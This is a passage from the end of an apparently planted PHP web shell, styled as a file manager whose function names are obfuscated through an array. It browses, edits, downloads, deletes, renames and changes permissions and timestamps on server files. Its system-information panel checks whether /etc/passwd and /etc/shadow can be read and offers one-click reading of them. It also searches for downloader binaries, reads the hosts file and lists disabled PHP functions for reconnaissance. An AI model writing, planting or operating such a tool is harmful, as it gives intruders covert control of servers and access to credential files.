        <div class="flex items-center gap-1.5 whitespace-nowrap"><span class="text-zinc-400">Perm:</span> <span class="<?php echo ($fi_pc=='g'?'text-green-600':($fi_pc=='y'?'text-zinc-700':'text-red-600')); ?> font-medium"><?php echo $fi_perms; ?></span> <span class="<?php echo ($fi_pc=='g'?'text-green-500':($fi_pc=='y'?'text-zinc-400':'text-red-400')); ?>">(<?php echo $fi_o; ?>)</span></div>
        <div class="flex items-center gap-1.5 whitespace-nowrap"><span class="text-zinc-400">User:</span> <span class="text-zinc-700 font-medium truncate max-w-[120px]" title="<?php echo $fi_og; ?>"><?php echo $fi_og; ?></span></div>
        <div class="w-px h-3 bg-zinc-300 mx-0.5 hidden sm:block"></div>
        <div class="flex items-center gap-1.5 whitespace-nowrap"><span class="text-zinc-400">Created:</span> <span class="text-zinc-700 font-medium"><?php echo $fi_ctime; ?></span></div>
        <div class="flex items-center gap-1.5 whitespace-nowrap"><span class="text-zinc-400">Modified:</span> <span class="text-zinc-700 font-medium"><?php echo $fi_mtime; ?></span></div>
        <div class="flex items-center gap-1.5 whitespace-nowrap"><span class="text-zinc-400">Accessed:</span> <span class="text-zinc-700 font-medium"><?php echo $fi_atime; ?></span></div>
    </div>

    <div class="flex-1 overflow-hidden relative bg-white">
        <input type="hidden" id="edp" value="<?php echo htmlspecialchars($ef); ?>">
        <textarea id="edc" class="w-full h-full p-4 font-mono text-xs text-zinc-800 focus:outline-none resize-none leading-relaxed" spellcheck="false"><?php echo htmlspecialchars($ec,ENT_QUOTES,$ib?'ISO-8859-1':'UTF-8'); ?></textarea>
        <pre id="edv" class="hidden w-full h-full p-4 font-mono text-xs text-zinc-800 overflow-auto whitespace-pre-wrap break-all leading-relaxed bg-zinc-50"></pre>
    </div>
</div>
<?php else: ?>
<div id="pb" class="hidden bg-[#18181b] border border-zinc-800 rounded-lg shadow-md px-3 py-2.5 flex flex-wrap items-center gap-2 sm:gap-3">
<div class="flex items-center gap-2.5 min-w-0 flex-1">
<div class="w-1.5 h-1.5 rounded-full bg-green-400 shadow-[0_0_6px_rgba(74,222,128,0.4)] flex-shrink-0"></div>
<span id="pbt" class="text-[11px] text-zinc-300 font-medium truncate"></span>
</div>
<div class="flex items-center gap-2 flex-shrink-0">
<button onclick="cbPa()" class="h-7 px-3 bg-white text-zinc-900 rounded text-[10px] font-bold hover:bg-zinc-100 transition-colors shadow-sm flex items-center gap-1.5"><i class="ph-bold ph-clipboard text-[9px]"></i>Paste</button>
<button onclick="cbClr()" class="h-7 px-3 text-zinc-400 hover:text-zinc-200 border border-zinc-700 rounded text-[10px] font-medium hover:bg-zinc-800 transition-colors">Clear</button>
</div>
</div>
<div class="bg-white border border-zinc-200 rounded-lg shadow-sm overflow-hidden flex flex-col">
<div class="overflow-x-auto">
<table class="w-full text-left border-collapse text-[9px]">
<thead class="bg-zinc-50 border-b border-zinc-200">
<tr>
<th class="w-8 px-3 py-2 text-center border-r border-zinc-100">
<input type="checkbox" onchange="ts(this)" class="w-3.5 h-3.5 rounded-[3px] border-zinc-300 text-zinc-900 focus:ring-0 focus:ring-offset-0 focus:border-zinc-900 transition-all cursor-pointer bg-white checked:bg-zinc-900 checked:border-zinc-900">
</th>
<th class="px-3 py-2 font-semibold text-zinc-600 text-[9px] uppercase tracking-wider w-1/3 border-r border-zinc-100">Name</th>
<th class="px-3 py-2 font-semibold text-zinc-600 text-[9px] uppercase tracking-wider text-right w-20 border-r border-zinc-100">Size</th>
<th class="px-3 py-2 font-semibold text-zinc-600 text-[9px] uppercase tracking-wider w-32 border-r border-zinc-100 whitespace-nowrap">Date</th>
<th class="px-3 py-2 font-semibold text-zinc-600 text-[9px] uppercase tracking-wider text-center w-20 border-r border-zinc-100">Perm</th>
<th class="px-3 py-2 font-semibold text-zinc-600 text-[9px] uppercase tracking-wider w-32 border-r border-zinc-100">Owner/Group</th>
<th class="px-3 py-2 font-semibold text-zinc-600 text-[9px] uppercase tracking-wider text-right w-24">Actions</th>
</tr>
</thead>
<tbody class="divide-y divide-zinc-200">
<?php
$tr_class = 'class="group hover:bg-zinc-50 transition-colors"';
if($pg==1){
?>
<tr class="group hover:bg-zinc-50 transition-colors cursor-pointer" onclick="g('<?php echo addslashes($a2[15]($b1)); ?>')">
<td class="px-3 py-2 border-r border-zinc-50 group-hover:border-zinc-100"></td>
<td class="px-3 py-2" colspan="6">
<div class="flex items-center gap-2 text-zinc-400 group-hover:text-zinc-800 transition-colors">
<i class="ph-bold ph-arrow-u-up-left text-sm"></i>
<span class="font-medium text-[11px]">.. (Parent)</span>
</div>
</td>
</tr>
<?php
}

$ds=array();
$fs=array();
if($d=@$a2[3]($b1)){while(($i=@$a2[4]($d))!==false){if($i=='.'||$i=='..')continue;$p=$b1.DIRECTORY_SEPARATOR.$i;if(@$a2[7]($p))$ds[]=$i;else$fs[]=$i;}@$a2[5]($d);}
natsort($ds);natsort($fs);
$all=array();
foreach($ds as $i)$all[]=array('t'=>'d','n'=>$i);
foreach($fs as $i)$all[]=array('t'=>'f','n'=>$i);

$limit=500;
$total=count($all);
$pages=ceil($total/$limit);
if($pages<1)$pages=1;
$offset=($pg-1)*$limit;
$items=array_slice($all,$offset,$limit);

foreach($items as $it){
  $i=$it['n'];
  $type=$it['t'];
  $p=$b1.DIRECTORY_SEPARATOR.$i;
  $o=go($p);
  $c=pc($p);
  $dt=fmt_date($p);
  $s=($type=='f')?fs(@$a2[26]($p)):'-';
  $uid=@$a2[48]($p);$gid=@$a2[49]($p);
  $ow='0';$gr='0';
  if(function_exists($a2[40])){if($uid!==false){$pw=@$a2[40]($uid);if(is_array($pw)&&isset($pw['name']))$ow=$pw['name'];else $ow=$uid;}}
  if(function_exists($a2[41])){if($gid!==false){$pgr=@$a2[41]($gid);if(is_array($pgr)&&isset($pgr['name']))$gr=$pgr['name'];else $gr=$gid;}}
  $og=$ow.'/'.$gr;
  
  echo '<tr '.$tr_class.'>';
  echo '<td class="px-3 py-2 text-center border-r border-zinc-50 group-hover:border-zinc-100"><input type="checkbox" name="i[]" value="'.htmlspecialchars($i).'" onchange="bu()" class="w-3.5 h-3.5 rounded-[3px] border-zinc-300 text-zinc-900 focus:ring-0 focus:ring-offset-0 focus:border-zinc-900 transition-all cursor-pointer bg-white checked:bg-zinc-900 checked:border-zinc-900"></td>';
  
  echo '<td class="px-3 py-2 border-r border-zinc-50 group-hover:border-zinc-100">';
  if($type=='d'){
    echo '<a onclick="pf(\''.addslashes($p).'\')" class="flex items-center gap-2.5 cursor-pointer block">';
    echo '<i class="ph-fill ph-folder text-yellow-500 text-sm flex-shrink-0"></i>';
    echo '<span class="font-medium text-zinc-700 group-hover:text-black transition-colors truncate max-w-[200px] sm:max-w-xs text-[10px]">'.htmlspecialchars($i).'</span>';
    echo '</a>';
  }else{
    echo '<a onclick="v(\''.addslashes($p).'\')" class="flex items-center gap-2.5 cursor-pointer block">';
    echo '<i class="ph-fill ph-file-text text-zinc-400 text-sm flex-shrink-0"></i>';
    echo '<span class="font-medium text-zinc-700 group-hover:text-black transition-colors truncate max-w-[200px] sm:max-w-xs text-[10px]">'.htmlspecialchars($i).'</span>';
    echo '</a>';
  }
  echo '</td>';
  
  echo '<td class="px-3 py-2 text-right text-zinc-500 font-mono text-[9px] border-r border-zinc-50 group-hover:border-zinc-100 whitespace-nowrap">'.$s.'</td>';
  
  echo '<td class="px-3 py-2 text-zinc-500 font-mono text-[9px] border-r border-zinc-50 group-hover:border-zinc-100 cursor-pointer hover:text-blue-500 whitespace-nowrap" onclick="pt(\''.addslashes($i).'\',\''.$dt.'\')">'.$dt.'</td>';
  
  echo '<td class="px-3 py-2 text-center border-r border-zinc-50 group-hover:border-zinc-100"><span onclick="ph(\''.addslashes($i).'\',\''.$o.'\')" class="inline-block px-1.5 py-0.5 border rounded text-[8px] font-mono cursor-pointer whitespace-nowrap '.($c=='g'?'bg-green-50 text-green-700 border-green-200':($c=='y'?'bg-zinc-100 text-zinc-600 border-zinc-200':'bg-red-50 text-red-600 border-red-200')).'">'.xp($p).'</span></td>';
  echo '<td class="px-3 py-2 text-zinc-500 font-mono text-[9px] border-r border-zinc-50 group-hover:border-zinc-100 truncate max-w-[180px]">'.htmlspecialchars($og).'</td>';
  
  echo '<td class="px-3 py-2 text-right"><div class="flex items-center justify-end gap-2">';
  if($type=='f') {
      echo '<button onclick="v(\''.addslashes($p).'\')" class="p-1 text-zinc-400 hover:text-zinc-800 rounded hover:bg-zinc-200 transition-colors" title="Edit"><i class="ph-bold ph-code"></i></button>';
      echo '<button onclick="dl(\''.$i.'\')" class="p-1 text-zinc-400 hover:text-zinc-800 rounded hover:bg-zinc-200 transition-colors" title="Download"><i class="ph-bold ph-download-simple"></i></button>';
  }
  echo '<button onclick="pr(\''.addslashes($i).'\')" class="p-1 text-zinc-400 hover:text-zinc-800 rounded hover:bg-zinc-200 transition-colors" title="Rename"><i class="ph-bold ph-pencil-simple"></i></button>';
  echo '<button onclick="pd(\''.addslashes($i).'\')" class="p-1 text-zinc-400 hover:text-red-600 rounded hover:bg-red-50 transition-colors" title="Delete"><i class="ph-bold ph-trash"></i></button>';
  echo '</div></td></tr>';
}
?>
</tbody>
</table>
</div>
<div class="bg-zinc-50 px-3 py-2 border-t border-zinc-200 flex justify-between items-center text-[9px] text-zinc-500">
<div class="flex items-center gap-1.5 select-none"><span class="font-semibold text-zinc-400 uppercase tracking-wider">Server</span><span class="font-mono text-zinc-600"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span></div>
<div class="flex items-center gap-2">
<?php if($pages>1): ?>
  <?php if($pg>1): ?><button onclick="sb('l',{pg:<?php echo $pg-1; ?>})" class="px-2 py-1 bg-white border border-zinc-300 rounded hover:bg-zinc-100">Prev</button><?php endif; ?>
  <span class="font-mono">Page <?php echo $pg; ?> / <?php echo $pages; ?> (<?php echo $total; ?> items)</span>
  <?php if($pg<$pages): ?><button onclick="sb('l',{pg:<?php echo $pg+1; ?>})" class="px-2 py-1 bg-white border border-zinc-300 rounded hover:bg-zinc-100">Next</button><?php endif; ?>
<?php else: ?>
  <span class="font-mono"><?php echo $total; ?> items</span>
<?php endif; ?>
</div>
</div>
</div>
<?php endif; ?>
</div>

<div id="bb" class="fixed bottom-6 left-1/2 -translate-x-1/2 sm:left-auto sm:right-8 sm:translate-x-0 bg-zinc-900/95 backdrop-blur-md border border-zinc-700/50 p-2 sm:p-2.5 rounded-2xl sm:rounded-lg shadow-2xl flex items-center gap-1 sm:gap-3 transition-all duration-400 ease-[cubic-bezier(0.16,1,0.3,1)] transform translate-y-12 opacity-0 scale-95 pointer-events-none z-40">
<span id="sc" class="px-2 sm:px-0 text-[11px] sm:text-xs font-bold text-zinc-400 whitespace-nowrap">0 Selected</span>
<div class="h-5 sm:h-4 w-px bg-zinc-700 mx-1 sm:mx-0"></div>
<button onclick="cbSet('c')" class="h-9 w-9 sm:h-auto sm:w-auto flex items-center justify-center sm:gap-1.5 rounded-xl sm:rounded-none text-zinc-300 hover:text-blue-400 hover:bg-zinc-800 sm:hover:bg-transparent transition-colors font-medium active:scale-95 sm:active:scale-100" title="Copy">
<i class="ph-bold ph-copy text-sm"></i><span class="text-xs hidden sm:inline">Copy</span>
</button>
<button onclick="cbSet('m')" class="h-9 w-9 sm:h-auto sm:w-auto flex items-center justify-center sm:gap-1.5 rounded-xl sm:rounded-none text-zinc-300 hover:text-yellow-400 hover:bg-zinc-800 sm:hover:bg-transparent transition-colors font-medium active:scale-95 sm:active:scale-100" title="Cut">
<i class="ph-bold ph-scissors text-sm"></i><span class="text-xs hidden sm:inline">Cut</span>
</button>
<button onclick="ba('z')" class="h-9 w-9 sm:h-auto sm:w-auto flex items-center justify-center sm:gap-1.5 rounded-xl sm:rounded-none text-zinc-300 hover:text-green-400 hover:bg-zinc-800 sm:hover:bg-transparent transition-colors font-medium active:scale-95 sm:active:scale-100" title="Compress">
<i class="ph-bold ph-file-archive text-sm"></i><span class="text-xs hidden sm:inline">Compress</span>
</button>
<div class="h-5 sm:h-4 w-px bg-zinc-700 mx-1 sm:mx-0"></div>
<button onclick="ba('d')" class="h-9 w-9 sm:h-auto sm:w-auto flex items-center justify-center sm:gap-1.5 rounded-xl sm:rounded-none text-zinc-300 hover:text-red-400 hover:bg-zinc-800 sm:hover:bg-transparent transition-colors font-medium active:scale-95 sm:active:scale-100" title="Delete">
<i class="ph-bold ph-trash text-sm"></i><span class="text-xs hidden sm:inline">Delete</span>
</button>
</div>

<?php if($m && !$ed): ?>
<div id="toast" class="msg <?php echo (strpos($m,'failed')!==false||strpos($m,'not found')!==false||strpos($m,'denied')!==false||strpos($m,'Cannot')!==false)?'err':'ok'; ?> transition-all duration-300 transform translate-y-0 opacity-100">
    <span><?php echo $m; ?></span>
</div>
<?php endif; ?>

<?php
function r($id,$t,$b,$oc,$in){echo'<div id="'.$id.'" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4"><div class="absolute inset-0 bg-white/60 backdrop-blur-sm" onclick="cm(\''.$id.'\')"></div><div class="relative bg-white rounded-lg shadow-2xl ring-1 ring-zinc-900/5 p-5 w-full max-w-sm"><h3 class="text-sm font-bold text-zinc-900 mb-1">'.$t.'</h3><input type="text" id="'.$in.'" class="w-full bg-zinc-50 border border-zinc-200 rounded-md px-3 py-2 text-xs mb-4 focus:ring-1 focus:ring-zinc-900 focus:bg-white focus:border-zinc-900 transition-all outline-none"><div class="flex justify-end gap-2"><button type="button" onclick="cm(\''.$id.'\')" class="px-3 py-1.5 rounded-md text-zinc-500 hover:bg-zinc-100 text-xs font-medium">Cancel</button><button onclick="'.$oc.'" class="px-3 py-1.5 bg-zinc-900 text-white rounded-md hover:bg-zinc-800 text-xs font-medium shadow-sm transition-transform active:scale-95">'.$b.'</button></div></div></div>';}
r('md','New Directory','Create',"sb('k',{n:document.getElementById('nd').value})",'nd');
r('mf','New File','Create',"sb('f',{n:document.getElementById('nf').value})",'nf');
?>

<div id="mr" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
<div class="absolute inset-0 bg-white/60 backdrop-blur-sm" onclick="cm('mr')"></div>
<div class="relative bg-white rounded-lg shadow-2xl ring-1 ring-zinc-900/5 p-5 w-full max-w-sm">
<h3 class="text-sm font-bold text-zinc-900 mb-4">Rename</h3>
<input type="hidden" id="ro"><input type="text" id="rn" class="w-full bg-zinc-50 border border-zinc-200 rounded-md px-3 py-2 text-xs mb-4 focus:ring-1 focus:ring-zinc-900 focus:bg-white focus:border-zinc-900 transition-all outline-none">
<div class="flex justify-end gap-2">
<button type="button" onclick="cm('mr')" class="px-3 py-1.5 rounded-md text-zinc-500 hover:bg-zinc-100 text-xs font-medium">Cancel</button>
<button onclick="sb('n',{o:document.getElementById('ro').value,n:document.getElementById('rn').value})" class="px-3 py-1.5 bg-zinc-900 text-white rounded-md hover:bg-zinc-800 text-xs font-medium shadow-sm transition-transform active:scale-95">Save</button>
</div>
</div>
</div>

<div id="mc" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
<div class="absolute inset-0 bg-white/60 backdrop-blur-sm" onclick="cm('mc')"></div>
<div class="relative bg-white rounded-lg shadow-2xl ring-1 ring-zinc-900/5 p-5 w-full max-w-sm">
<h3 class="text-sm font-bold text-zinc-900 mb-4">Permissions</h3>
<input type="hidden" id="ct"><input type="text" id="cp" class="w-full bg-zinc-50 border border-zinc-200 rounded-md px-3 py-2 text-xs mb-4 font-mono focus:ring-1 focus:ring-zinc-900 focus:bg-white focus:border-zinc-900 transition-all outline-none" placeholder="0644">
<div class="flex justify-end gap-2">
<button type="button" onclick="cm('mc')" class="px-3 py-1.5 rounded-md text-zinc-500 hover:bg-zinc-100 text-xs font-medium">Cancel</button>
<button onclick="sb('h',{w:document.getElementById('ct').value,r:document.getElementById('cp').value})" class="px-3 py-1.5 bg-zinc-900 text-white rounded-md hover:bg-zinc-800 text-xs font-medium shadow-sm transition-transform active:scale-95">Update</button>
</div>
</div>
</div>

<div id="m-info" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
<div class="absolute inset-0 bg-white/60 backdrop-blur-sm" onclick="cm('m-info')"></div>
<div class="relative bg-white rounded-lg shadow-2xl ring-1 ring-zinc-900/5 p-5 w-full max-w-2xl max-h-[80vh] overflow-y-auto">
<div class="flex items-center justify-between mb-4 border-b border-zinc-100 pb-3">
<h3 class="text-sm font-bold text-zinc-900 flex items-center gap-2"><i class="ph-fill ph-info text-blue-500"></i> System Information</h3>
<button type="button" onclick="cm('m-info')" class="text-zinc-400 hover:text-zinc-900"><i class="ph-bold ph-x"></i></button>
</div>
<div class="space-y-4 font-mono text-[10px] text-zinc-600 leading-relaxed">
<?php
$apache_mods = function_exists($a2[50]) ? implode(', ', $a2[50]()) : 'Not available';
$curl_supp = function_exists($a2[51]) ? 'enabled' : 'disabled';
$db_supp = array();
if(function_exists($a2[52])) $db_supp[] = 'MySQLi';
if(function_exists($a2[53])) $db_supp[] = 'PostgreSQL';
if(class_exists('PDO')) $db_supp[] = 'PDO';
$dbs = !empty($db_supp) ? implode(', ', $db_supp) : 'None';

$passwd_read = @$a2[46]($a2[58]) ? '<div class="flex items-center gap-2 justify-end"><span class="text-green-600 font-bold">Readable!</span><button onclick="cm(\'m-info\'); v(\''.$a2[58].'\');" class="px-2 py-0.5 bg-zinc-100 border border-zinc-200 rounded text-zinc-600 hover:bg-zinc-200 text-[9px] uppercase font-bold transition-colors">Read</button></div>' : '<span class="text-zinc-400">Protected</span>';
$shadow_read = @$a2[46]($a2[59]) ? '<div class="flex items-center gap-2 justify-end"><span class="text-red-600 font-bold">Readable!</span><button onclick="cm(\'m-info\'); v(\''.$a2[59].'\');" class="px-2 py-0.5 bg-zinc-100 border border-zinc-200 rounded text-zinc-600 hover:bg-zinc-200 text-[9px] uppercase font-bold transition-colors">Read</button></div>' : '<span class="text-zinc-400">Protected</span>';

$os_info = function_exists($a2[23]) ? $a2[23]('a') : PHP_OS;
$distr_name = "Windows (Information limit)";
if (!$is_win) {
    $distr_name = @$a2[8]($a2[60]) ? preg_match('/PRETTY_NAME="([^"]+)"/', $a2[8]($a2[60]), $m) ? $m[1] : 'Linux' : 'Linux';
}

$useful_bins = explode(',',$a2[63]);
$dl_bins = explode(',',$a2[64]);
$found_useful = array();
$found_dl = array();

if(!$is_win){
    $bin_paths = explode(',',$a2[65]);
    foreach($useful_bins as $b){foreach($bin_paths as $bp){if(@$a2[6]($bp.$b)){$found_useful[]=$b;break;}}}
    foreach($dl_bins as $b){foreach($bin_paths as $bp){if(@$a2[6]($bp.$b)){$found_dl[]=$b;break;}}}
}else{
    $found_useful[] = "N/A on Windows";
    $found_dl[] = "N/A on Windows";
}

$hdd_mounts = array();
if(!$is_win){
    $hdd_paths = array('/','/home','/tmp','/var','/boot');
    $hdd_seen = array();
    foreach($hdd_paths as $hp){if(@$a2[7]($hp)){$ht=@$a2[38]($hp);$hf=@$a2[39]($hp);if($ht>0){$hk=$ht.'_'.$hf;if(!isset($hdd_seen[$hk])){$hdd_seen[$hk]=1;$hp_pct=$ht>0?round(($ht-$hf)/$ht*100):0;$hdd_mounts[]=array('p'=>$hp,'t'=>fs($ht),'f'=>fs($hf),'pct'=>$hp_pct);}}}}
}else{
    foreach(range('C','Z') as $dl){$dr=$dl.':';if(@$a2[7]($dr.'\\')){$ht=@$a2[38]($dr);$hf=@$a2[39]($dr);if($ht>0){$hp_pct=round(($ht-$hf)/$ht*100);$hdd_mounts[]=array('p'=>$dr,'t'=>fs($ht),'f'=>fs($hf),'pct'=>$hp_pct);}}}
}

$hosts_file = "";
if(!$is_win && @$a2[46]($a2[61])) $hosts_file = $a2[31]($a2[8]($a2[61]));
elseif($is_win && @$a2[46]($a2[62])) $hosts_file = $a2[31]($a2[8]($a2[62]));

$uid_info = 'Unknown';
if(function_exists($a2[40])){ $teuid = @$a2[42](); $tpw = @$a2[40]($teuid); if(is_array($tpw)&&isset($tpw['name'])) $uid_info = $tpw['name']." ( ".$teuid." )"; else $uid_info = $teuid; }
$gid_info = 'Unknown';
if(function_exists($a2[41])){ $tegid = @$a2[43](); $tpg = @$a2[41]($tegid); if(is_array($tpg)&&isset($tpg['name'])) $gid_info = $tpg['name']." ( ".$tegid." )"; else $gid_info = $tegid; }
if($is_win){ $uid_info = $a2[44](); $gid_info = "Windows Group"; }

$php_version = $a2[45]();
$safe_mode = $a2[57]('safe_mode') ? 'ON' : 'OFF';
$dt = $a2[55]('Y-m-d H:i:s');

$ds_tot = $a2[38]($b1);
$ds_fre = $a2[39]($b1);
$ds_perc = $ds_tot > 0 ? round(($ds_tot - $ds_fre) / $ds_tot * 100) : 0;
?>

<?php
function fm_kv($l, $v) {
    return '<div class="flex justify-between items-start py-1.5 border-b border-zinc-100 last:border-0 gap-4"><span class="text-zinc-500 flex-shrink-0">'.$l.'</span><span class="text-zinc-900 font-medium text-right break-words">'.$v.'</span></div>';
}
?>
<div class="grid grid-cols-1 md:grid-cols-2 gap-4">
    <div class="border border-zinc-200 rounded-lg overflow-hidden">
        <div class="bg-zinc-50 px-3 py-2 border-b border-zinc-200 font-bold text-[10px] text-zinc-700 uppercase tracking-wider flex items-center gap-1.5">
            <i class="ph-bold ph-globe text-zinc-400"></i> Web & PHP
        </div>
        <div class="p-3 bg-white">
            <?php echo fm_kv('Software', $_SERVER['SERVER_SOFTWARE']); ?>
            <?php echo fm_kv('PHP Version', $php_version . ' <span class="text-zinc-400 font-normal">(Safe Mode: '.$safe_mode.')</span>'); ?>
            <?php echo fm_kv('cURL Support', $curl_supp === 'enabled' ? '<span class="text-green-600">Enabled</span>' : '<span class="text-red-600">Disabled</span>'); ?>
            <?php echo fm_kv('Databases', $dbs); ?>
            <div class="mt-2 text-zinc-500 mb-1">Disabled Functions</div>
            <div class="bg-zinc-50 p-2 rounded border border-zinc-200 break-all text-[9px] text-red-700/80"><?php echo $df_display; ?></div>
        </div>
    </div>

    <div class="border border-zinc-200 rounded-lg overflow-hidden">
        <div class="bg-zinc-50 px-3 py-2 border-b border-zinc-200 font-bold text-[10px] text-zinc-700 uppercase tracking-wider flex items-center gap-1.5">
            <i class="ph-bold ph-cpu text-zinc-400"></i> System & OS
        </div>
        <div class="p-3 bg-white">
            <?php echo fm_kv('OS', $distr_name); ?>
            <?php echo fm_kv('Datetime', $dt); ?>
            <div class="mt-2 text-zinc-500 mb-1">Available Binaries</div>
            <div class="bg-zinc-50 p-2 rounded border border-zinc-200 break-all text-[9px]">
                <span class="text-zinc-400">Useful:</span> <span class="text-zinc-700"><?php echo !empty($found_useful) ? implode(', ', $found_useful) : 'None'; ?></span><br>
                <div class="h-px w-full bg-zinc-200 my-1"></div>
                <span class="text-zinc-400">Downloaders:</span> <span class="text-zinc-700"><?php echo !empty($found_dl) ? implode(', ', $found_dl) : 'None'; ?></span>
            </div>
        </div>
    </div>
</div>

<div class="mt-4 border border-zinc-200 rounded-lg overflow-hidden">
    <div class="bg-zinc-50 px-3 py-2 border-b border-zinc-200 font-bold text-[10px] text-zinc-700 uppercase tracking-wider flex items-center gap-1.5">
        <i class="ph-bold ph-lock-key text-zinc-400"></i> Security & Permissions
    </div>
    <div class="p-3 bg-white grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-1">
        <div>
            <?php echo fm_kv('User (UID)', $uid_info); ?>
            <?php echo fm_kv('Group (GID)', $gid_info); ?>
        </div>
        <div>
            <?php echo fm_kv($a2[58], $passwd_read); ?>
            <?php echo fm_kv($a2[59], $shadow_read); ?>
        </div>
    </div>
</div>

<div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
    <div class="border border-zinc-200 rounded-lg overflow-hidden flex flex-col h-full">
        <div class="bg-zinc-50 px-3 py-2 border-b border-zinc-200 font-bold text-[10px] text-zinc-700 uppercase tracking-wider flex items-center gap-1.5 flex-shrink-0">
            <i class="ph-bold ph-hard-drives text-zinc-400"></i> Storage
        </div>
        <div class="p-3 bg-white flex-1 flex flex-col min-h-0">
            <div class="flex items-center justify-between mb-2">
                <span class="text-zinc-500">Current Directory</span>
                <span class="text-zinc-900 font-medium"><?php echo fs($ds_fre); ?> free of <?php echo fs($ds_tot); ?></span>
            </div>
            <div class="w-full bg-zinc-100 rounded-full h-1.5 mb-3 flex-shrink-0">
                <div class="bg-blue-500 h-1.5 rounded-full" style="width: <?php echo $ds_perc; ?>%"></div>
            </div>
            <div class="flex-1 min-h-[150px] bg-zinc-900 rounded border border-zinc-800 p-2.5 overflow-auto shadow-inner">
<?php if(!empty($hdd_mounts)): ?>
<table class="w-full text-[9px] font-mono text-zinc-300">
<tr class="text-zinc-500 border-b border-zinc-700"><td class="pb-1.5">Mount</td><td class="pb-1.5 text-right">Total</td><td class="pb-1.5 text-right">Free</td><td class="pb-1.5 text-right">Used</td><td class="pb-1.5 pl-2 w-16"></td></tr>
<?php foreach($hdd_mounts as $hm): ?><tr class="border-b border-zinc-800/50"><td class="py-1.5 text-zinc-100 font-medium"><?php echo $hm['p']; ?></td><td class="py-1.5 text-right"><?php echo $hm['t']; ?></td><td class="py-1.5 text-right text-green-400"><?php echo $hm['f']; ?></td><td class="py-1.5 text-right"><?php echo $hm['pct']; ?>%</td><td class="py-1.5 pl-2"><div class="w-full bg-zinc-700 rounded-full h-1"><div class="bg-blue-500 h-1 rounded-full" style="width:<?php echo $hm['pct']; ?>%"></div></div></td></tr>
<?php endforeach; ?>
</table>
<?php else: ?><span class="text-zinc-500 text-[9px]">No disk info available</span><?php endif; ?>
            </div>
        </div>
    </div>
    <div class="border border-zinc-200 rounded-lg overflow-hidden flex flex-col h-full">
        <div class="bg-zinc-50 px-3 py-2 border-b border-zinc-200 font-bold text-[10px] text-zinc-700 uppercase tracking-wider flex items-center gap-1.5 flex-shrink-0">
            <i class="ph-bold ph-network text-zinc-400"></i> Network & Hosts
        </div>
        <div class="p-3 bg-white flex-1 flex flex-col min-h-0">
            <div class="relative flex-1 min-h-[150px] md:min-h-0">
                <pre class="absolute inset-0 bg-zinc-900 text-zinc-300 p-2.5 rounded border border-zinc-800 overflow-auto text-[9px] font-mono leading-relaxed shadow-inner scrollbar-thin"><?php echo $hosts_file ? $hosts_file : 'Not readable'; ?></pre>
            </div>
        </div>
    </div>
</div>

</div>
<div class="mt-4 flex justify-end">
<button type="button" onclick="cm('m-info')" class="px-3 py-1.5 bg-zinc-900 text-white rounded-md hover:bg-zinc-800 text-xs font-medium shadow-sm transition-transform active:scale-95">Close</button>
</div>
</div>
</div>

<div id="mt" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
<div class="absolute inset-0 bg-white/60 backdrop-blur-sm" onclick="cm('mt')"></div>
<div class="relative bg-white rounded-lg shadow-2xl ring-1 ring-zinc-900/5 p-5 w-full max-w-sm">
<h3 class="text-sm font-bold text-zinc-900 mb-4">Edit Date</h3>
<input type="hidden" id="tn"><input type="text" id="td" class="w-full bg-zinc-50 border border-zinc-200 rounded-md px-3 py-2 text-xs mb-4 font-mono focus:ring-1 focus:ring-zinc-900 focus:bg-white focus:border-zinc-900 transition-all outline-none">
<div class="flex justify-end gap-2">
<button type="button" onclick="cm('mt')" class="px-3 py-1.5 rounded-md text-zinc-500 hover:bg-zinc-100 text-xs font-medium">Cancel</button>
<button onclick="sb('t',{w:document.getElementById('tn').value,d:document.getElementById('td').value})" class="px-3 py-1.5 bg-zinc-900 text-white rounded-md hover:bg-zinc-800 text-xs font-medium shadow-sm transition-transform active:scale-95">Update</button>
</div>
</div>
</div>
</body>
</html>
